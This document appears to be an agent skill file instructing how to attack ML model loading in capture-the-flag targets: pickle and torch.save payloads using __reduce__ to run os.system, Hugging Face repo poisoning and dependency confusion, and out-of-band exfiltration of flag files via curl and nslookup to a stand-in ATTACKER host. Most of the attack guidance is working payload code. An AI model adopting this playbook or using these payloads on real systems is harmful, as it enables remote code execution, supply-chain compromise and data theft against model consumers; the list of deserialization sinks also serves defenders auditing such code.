---
name: ai-ml-supply-chain
description: AI/ML model supply-chain and deserialization attacks. Use when the target loads models, weights, checkpoints, or serialized objects (PyTorch .pt/.pth, joblib .pkl, pickle, ONNX, TensorFlow SavedModel) that an attacker can influence, or when it downloads models from a registry (Hugging Face / model hub). The flagship move is pickle RCE: a crafted model file executes arbitrary code on load.
---

# AI/ML Supply-Chain & Model Deserialization

## 1. Pickle / model-file RCE (the flagship)

Python pickle executes code on deserialization. PyTorch `.pt`/`.pth`, joblib `.pkl`, and many model formats are pickle under the hood. If the target downloads/loads a model you control (or you can upload/replace one), the "model" is just a code carrier:

```python
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ("cat /flag* | curl -X POST http://ATTACKER/ -d @-",))
torch.save(Evil(), "evil.pt")     # any .pt/.pth with a __reduce__ executes on load
```

joblib / pickle direct:
```python
import pickle, os
class E:
    def __reduce__(self): return (os.system, ("curl http://ATTACKER/$(cat /flag*)",))
open("evil.pkl","wb").write(pickle.dumps(E()))
```

Then get the target to load it: a "download and analyze this model" endpoint, an ML pipeline that pulls from a repo, a checkpoint upload, or dependency confusion on a model package name.

## 2. Hugging Face / model-hub poisoning

If the app pulls from HF (or a private hub) by name, publish a same-name or dependency-confused repo carrying a malicious `pytorch_model.bin`/`*.pkl` + a `load()` hook. A repo's `config.json` can reference an `auto_map` / custom code path that runs arbitrary Python at load. Vector: the target does `AutoModel.from_pretrained("org/model")` — you control `org/model`.

## 3. ONNX / SavedModel / TF

ONNX and TensorFlow SavedModel can carry custom ops or lambdas. TF SavedModel `saved_model.pb` + a `variables/` dir; a malicious SavedModel's `__init__`-equivalent (custom op library) runs on `tf.saved_model.load`.

## 4. Deserialization sinks to look for

`pickle.loads`, `torch.load`, `joblib.load`, `tf.keras.models.load_model`, `np.load` (allow_pickle), `yaml.load` (unsafe loader), `joblib`/`dill` loads in an upload or import path.

## 5. Read the flag

The `__reduce__` should exfil: `curl http://ATTACKER/$(cat /flag*)`, `nslookup $(cat /flag*).ATTACKER`, or write to a web-accessible path. Prefer OOB because model-load code usually has no stdout channel.

## 6. Discipline

- Confirm the sink (does the target actually `load()` a model you can affect?) before crafting the payload.
- A model file is ONLY a code carrier if it is loaded with an unsafe loader (pickle-based). A pure-ONNX (no custom op) load is inert — check the loader first.
- Exfil via OOB/DNS; model loading is usually async and silent.
